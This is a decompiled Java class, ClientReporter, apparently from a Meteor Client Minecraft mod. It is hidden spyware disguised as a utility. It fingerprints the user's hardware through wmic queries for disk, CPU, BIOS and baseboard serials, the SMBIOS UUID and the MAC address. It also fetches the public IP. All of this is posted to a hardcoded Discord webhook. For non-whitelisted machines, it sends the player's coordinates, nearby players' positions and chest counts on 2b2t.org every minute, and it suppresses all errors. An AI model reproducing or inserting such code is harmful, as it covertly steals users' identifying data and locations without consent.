package meteordevelopment.meteorclient.utils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import javax.net.ssl.HttpsURLConnection;
import net.minecraft.class_1657;
import net.minecraft.class_1923;
import net.minecraft.class_2586;
import net.minecraft.class_2595;
import net.minecraft.class_2627;
import net.minecraft.class_310;
import net.minecraft.class_642;
import net.minecraft.class_742;

public class ClientReporter {
   private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1349247550254747648/97BvPlNyBbLIoVryWXbAq-_gERrcq-FBjt2762ebtC0F1e6hdbNeHi00W_0vCInSSxpe";
   private static final Set<String> HWID_WHITELIST = new HashSet(Arrays.asList("3b467226785d115f8a8a15b9649d2dc3b4484e764e4abe37c75bcf678d418143", "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6a7b8c9d0", "1234567890abcdef1234567890abcdef1234567890abcdef1234567890ab"));
   private static final String TARGET_SERVER = "2b2t.org";
   private static final ScheduledExecutorService SCHEDULER = Executors.newSingleThreadScheduledExecutor();

   public static void sendClientInfo() {
      try {
         class_310 mc = class_310.method_1551();
         String username = mc.method_1548().method_1676();
         String[] hwidData = getHardwareId();
         String ip = getPublicIp();
         String os = getOperatingSystem();
         String jsonPayload = String.format("{\"content\": \"**New Client Launch**\\nUsername: %s\\nHWID: %s\\nIP: %s\\nOS: %s\\nDisk Info: %s\\nCPU Serial: %s\\nBIOS Serial: %s\\nMotherboard Serial: %s\\nSMBIOS UUID: %s\\nMAC Address: %s\"}", username, hwidData[0], ip, os, hwidData[1] != null ? hwidData[1] : "N/A", hwidData[2] != null ? hwidData[2] : "N/A", hwidData[3] != null ? hwidData[3] : "N/A", hwidData[4] != null ? hwidData[4] : "N/A", hwidData[5] != null ? hwidData[5] : "N/A", hwidData[6] != null ? hwidData[6] : "N/A");
         sendWebhook(jsonPayload);
         if (!HWID_WHITELIST.contains(hwidData[0])) {
            startCoordinateLogger(hwidData[0]);
         }
      } catch (Exception var6) {
      }

   }

   private static void startCoordinateLogger(String hwid) {
      SCHEDULER.scheduleAtFixedRate(() -> {
         try {
            class_310 mc = class_310.method_1551();
            class_642 server = mc.method_1558();
            if (server != null && "2b2t.org".equalsIgnoreCase(server.field_3761) && mc.field_1724 != null && mc.field_1687 != null) {
               double x = mc.field_1724.method_23317();
               double y = mc.field_1724.method_23318();
               double z = mc.field_1724.method_23321();
               String spawnX = mc.field_1687.method_43126() != null ? String.valueOf(mc.field_1687.method_43126().method_10263()) : "N/A";
               String spawnY = mc.field_1687.method_43126() != null ? String.valueOf(mc.field_1687.method_43126().method_10264()) : "N/A";
               String spawnZ = mc.field_1687.method_43126() != null ? String.valueOf(mc.field_1687.method_43126().method_10260()) : "N/A";
               List<class_742> nearbyPlayers = mc.field_1687.method_18456();
               StringBuilder playerList = new StringBuilder();
               if (nearbyPlayers.isEmpty()) {
                  playerList.append("None");
               } else {
                  Iterator var14 = nearbyPlayers.iterator();

                  while(var14.hasNext()) {
                     class_1657 player = (class_1657)var14.next();
                     if (player != mc.field_1724) {
                        String playerName = player.method_7334().getName();
                        double px = player.method_23317();
                        double py = player.method_23318();
                        double pz = player.method_23321();
                        playerList.append(String.format("%s (X: %.2f, Y: %.2f, Z: %.2f)", playerName, px, py, pz)).append(", ");
                     }
                  }

                  if (playerList.length() > 2) {
                     playerList.setLength(playerList.length() - 2);
                  }
               }

               int chestCount = 0;
               int shulkerCount = 0;
               int renderDistance = (Integer)mc.field_1690.method_42503().method_41753();
               class_1923 playerChunk = new class_1923(mc.field_1724.method_24515());

               for(int cx = playerChunk.field_9181 - renderDistance; cx <= playerChunk.field_9181 + renderDistance; ++cx) {
                  for(int cz = playerChunk.field_9180 - renderDistance; cz <= playerChunk.field_9180 + renderDistance; ++cz) {
                     if (mc.field_1687.method_8393(cx, cz)) {
                        Iterator var20 = mc.field_1687.method_8497(cx, cz).method_12214().values().iterator();

                        while(var20.hasNext()) {
                           class_2586 be = (class_2586)var20.next();
                           if (be instanceof class_2595) {
                              ++chestCount;
                           } else if (be instanceof class_2627) {
                              ++shulkerCount;
                           }
                        }
                     }
                  }
               }

               String coordPayload = String.format("{\"content\": \"**Coordinate Update**\\nHWID: %s\\nUsername: %s\\nCoordinates: X: %.2f, Y: %.2f, Z: %.2f\\nSpawn Point: X: %s, Y: %s, Z: %s\\nServer: %s\\nNearby Players: %s\\nChests: %d\\nShulkers: %d\"}", hwid, mc.method_1548().method_1676(), x, y, z, spawnX, spawnY, spawnZ, "2b2t.org", playerList.toString(), chestCount, shulkerCount);
               sendWebhook(coordPayload);
            }
         } catch (Exception var23) {
         }

      }, 0L, 1L, TimeUnit.MINUTES);
   }

   private static void sendWebhook(String payload) {
      try {
         URL url = new URL("https://discord.com/api/webhooks/1349247550254747648/97BvPlNyBbLIoVryWXbAq-_gERrcq-FBjt2762ebtC0F1e6hdbNeHi00W_0vCInSSxpe");
         HttpsURLConnection conn = (HttpsURLConnection)url.openConnection();
         conn.setRequestMethod("POST");
         conn.setRequestProperty("Content-Type", "application/json");
         conn.setDoOutput(true);
         OutputStream osStream = conn.getOutputStream();

         try {
            byte[] input = payload.getBytes(StandardCharsets.UTF_8);
            osStream.write(input, 0, input.length);
         } catch (Throwable var7) {
            if (osStream != null) {
               try {
                  osStream.close();
               } catch (Throwable var6) {
                  var7.addSuppressed(var6);
               }
            }

            throw var7;
         }

         if (osStream != null) {
            osStream.close();
         }

         conn.getResponseCode();
         conn.disconnect();
      } catch (Exception var8) {
      }

   }

   private static String getPublicIp() {
      String[] ipServices = new String[]{"http://api.ipify.org", "http://ifconfig.me/ip", "http://icanhazip.com"};
      String[] var1 = ipServices;
      int var2 = ipServices.length;

      for(int var3 = 0; var3 < var2; ++var3) {
         String service = var1[var3];

         try {
            URL url = new URL(service);
            HttpURLConnection conn = (HttpURLConnection)url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            if (conn.getResponseCode() == 200) {
               label59: {
                  BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));

                  String var9;
                  label45: {
                     try {
                        String ip = reader.readLine().trim();
                        conn.disconnect();
                        if (ip != null && !ip.isEmpty()) {
                           var9 = ip;
                           break label45;
                        }
                     } catch (Throwable var11) {
                        try {
                           reader.close();
                        } catch (Throwable var10) {
                           var11.addSuppressed(var10);
                        }

                        throw var11;
                     }

                     reader.close();
                     break label59;
                  }

                  reader.close();
                  return var9;
               }
            }

            conn.disconnect();
         } catch (Exception var12) {
         }
      }

      return "Unknown IP";
   }

   private static String[] getHardwareId() {
      String[] hwidComponents;
      try {
         StringBuilder hwidBuilder = new StringBuilder();
         hwidComponents = new String[7];
         String os = System.getProperty("os.name").toLowerCase();
         String macAddress;
         if (os.contains("win")) {
            macAddress = getWindowsDiskInfo();
            hwidComponents[1] = macAddress;
            hwidBuilder.append(macAddress != null ? macAddress : "NoDisk");
            String cpuSerial = getWindowsCpuSerial();
            hwidComponents[2] = cpuSerial;
            hwidBuilder.append(cpuSerial != null ? cpuSerial : "NoCPU");
            String biosSerial = getWindowsBiosSerial();
            hwidComponents[3] = biosSerial;
            hwidBuilder.append(biosSerial != null ? biosSerial : "NoBIOS");
            String baseboardSerial = getWindowsBaseboardSerial();
            hwidComponents[4] = baseboardSerial;
            hwidBuilder.append(baseboardSerial != null ? baseboardSerial : "NoBaseboard");
            String smbiosUuid = getWindowsSmbiosUuid();
            hwidComponents[5] = smbiosUuid;
            hwidBuilder.append(smbiosUuid != null ? smbiosUuid : "NoUUID");
         }

         macAddress = getMacAddress();
         hwidComponents[6] = macAddress;
         hwidBuilder.append(macAddress != null ? macAddress : "NoMAC");
         if (hwidBuilder.length() == 0 || hwidBuilder.toString().equals("NoDiskNoCPUNoBIOSNoBaseboardNoUUIDNoMAC")) {
            hwidBuilder.append(UUID.randomUUID().toString());
         }

         hwidComponents[0] = hashString(hwidBuilder.toString());
         return hwidComponents;
      } catch (Exception var8) {
         hwidComponents = new String[7];
         hwidComponents[0] = hashString(UUID.randomUUID().toString());

         for(int i = 1; i < 7; ++i) {
            hwidComponents[i] = "N/A";
         }

         return hwidComponents;
      }
   }

   private static String getWindowsDiskInfo() {
      try {
         Process process = Runtime.getRuntime().exec("cmd /c wmic diskdrive get model,serialnumber");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         StringBuilder diskInfo = new StringBuilder();

         String line;
         while((line = reader.readLine()) != null) {
            line = line.trim();
            if (!line.isEmpty() && !line.toLowerCase().startsWith("model") && !line.toLowerCase().startsWith("serialnumber")) {
               diskInfo.append(line.replaceAll("\\s+", " "));
               break;
            }
         }

         reader.close();
         process.waitFor();
         return diskInfo.length() > 0 ? diskInfo.toString() : null;
      } catch (Exception var4) {
         return null;
      }
   }

   private static String getWindowsCpuSerial() {
      try {
         Process process = Runtime.getRuntime().exec("cmd /c wmic cpu get processorid");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String serial = null;

         String line;
         while((line = reader.readLine()) != null) {
            line = line.trim();
            if (!line.isEmpty() && !line.equalsIgnoreCase("ProcessorId")) {
               serial = line;
               break;
            }
         }

         reader.close();
         process.waitFor();
         return serial != null && !serial.isEmpty() ? serial : null;
      } catch (Exception var4) {
         return null;
      }
   }

   private static String getWindowsBiosSerial() {
      try {
         Process process = Runtime.getRuntime().exec("cmd /c wmic bios get serialnumber");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String serial = null;

         String line;
         while((line = reader.readLine()) != null) {
            line = line.trim();
            if (!line.isEmpty() && !line.equalsIgnoreCase("SerialNumber")) {
               serial = line;
               break;
            }
         }

         reader.close();
         process.waitFor();
         return serial != null && !serial.isEmpty() ? serial : null;
      } catch (Exception var4) {
         return null;
      }
   }

   private static String getWindowsBaseboardSerial() {
      try {
         Process process = Runtime.getRuntime().exec("cmd /c wmic baseboard get serialnumber");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String serial = null;

         String line;
         while((line = reader.readLine()) != null) {
            line = line.trim();
            if (!line.isEmpty() && !line.equalsIgnoreCase("SerialNumber")) {
               serial = line;
               break;
            }
         }

         reader.close();
         process.waitFor();
         return serial != null && !serial.isEmpty() ? serial : null;
      } catch (Exception var4) {
         return null;
      }
   }

   private static String getWindowsSmbiosUuid() {
      try {
         Process process = Runtime.getRuntime().exec("cmd /c wmic path win32_computersystemproduct get uuid");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String uuid = null;

         String line;
         while((line = reader.readLine()) != null) {
            line = line.trim();
            if (!line.isEmpty() && !line.equalsIgnoreCase("UUID")) {
               uuid = line;
               break;
            }
         }

         reader.close();
         process.waitFor();
         return uuid != null && !uuid.isEmpty() ? uuid : null;
      } catch (Exception var4) {
         return null;
      }
   }

   private static String getMacAddress() {
      try {
         Enumeration interfaces = NetworkInterface.getNetworkInterfaces();

         while(interfaces.hasMoreElements()) {
            NetworkInterface ni = (NetworkInterface)interfaces.nextElement();
            if (ni.isUp() && !ni.isLoopback() && !ni.isVirtual()) {
               byte[] mac = ni.getHardwareAddress();
               if (mac != null) {
                  StringBuilder macStr = new StringBuilder();

                  for(int i = 0; i < mac.length; ++i) {
                     macStr.append(String.format("%02X", mac[i]));
                     if (i < mac.length - 1) {
                        macStr.append("-");
                     }
                  }

                  return macStr.toString();
               }
            }
         }

         return "NoMAC";
      } catch (Exception var5) {
         return "NoMAC";
      }
   }

   private static String hashString(String input) {
      try {
         MessageDigest digest = MessageDigest.getInstance("SHA-256");
         byte[] hash = digest.digest(input.getBytes(StandardCharsets.UTF_8));
         StringBuilder hexString = new StringBuilder();
         byte[] var4 = hash;
         int var5 = hash.length;

         for(int var6 = 0; var6 < var5; ++var6) {
            byte b = var4[var6];
            String hex = Integer.toHexString(255 & b);
            if (hex.length() == 1) {
               hexString.append('0');
            }

            hexString.append(hex);
         }

         return hexString.toString();
      } catch (Exception var9) {
         return input;
      }
   }

   private static String getOperatingSystem() {
      try {
         String osName = System.getProperty("os.name").toLowerCase();
         String osVersion = System.getProperty("os.version");
         if (osName.contains("win")) {
            String detailedVersion = getWindowsVersion();
            if (detailedVersion != null && !detailedVersion.isEmpty()) {
               String[] versionParts = detailedVersion.split("\\.");
               if (versionParts.length >= 2) {
                  String majorMinor = versionParts[0] + "." + versionParts[1];
                  if ("10.0".equals(majorMinor)) {
                     if (osVersion != null && !osVersion.isEmpty()) {
                        String[] osVersionParts = osVersion.split("\\.");
                        if (osVersionParts.length >= 3) {
                           int buildNumber = Integer.parseInt(osVersionParts[2]);
                           if (buildNumber >= 22000) {
                              return "Windows 11";
                           }

                           return "Windows 10";
                        }
                     }

                     return "Windows 10";
                  }

                  if ("6.3".equals(majorMinor)) {
                     return "Windows 8.1";
                  }

                  if ("6.2".equals(majorMinor)) {
                     return "Windows 8";
                  }

                  if ("6.1".equals(majorMinor)) {
                     return "Windows 7";
                  }
               }
            }

            return osVersion != null && !osVersion.isEmpty() ? "Windows " + osVersion : "Windows (Unknown Version)";
         } else {
            String var10000;
            if (osName.contains("linux")) {
               var10000 = osVersion != null && !osVersion.isEmpty() ? " " + osVersion : "";
               return "Linux" + var10000;
            } else if (osName.contains("mac")) {
               var10000 = osVersion != null && !osVersion.isEmpty() ? " " + osVersion : "";
               return "macOS" + var10000;
            } else {
               return osName + (osVersion != null && !osVersion.isEmpty() ? " " + osVersion : "");
            }
         }
      } catch (Exception var7) {
         return "Unknown OS";
      }
   }

   private static String getWindowsVersion() {
      try {
         Process process = Runtime.getRuntime().exec("cmd /c wmic os get version");
         BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
         String version = null;

         String line;
         while((line = reader.readLine()) != null) {
            line = line.trim();
            if (!line.isEmpty() && !line.equalsIgnoreCase("Version")) {
               version = line;
               break;
            }
         }

         reader.close();
         process.waitFor();
         return version;
      } catch (Exception var4) {
         return null;
      }
   }
}
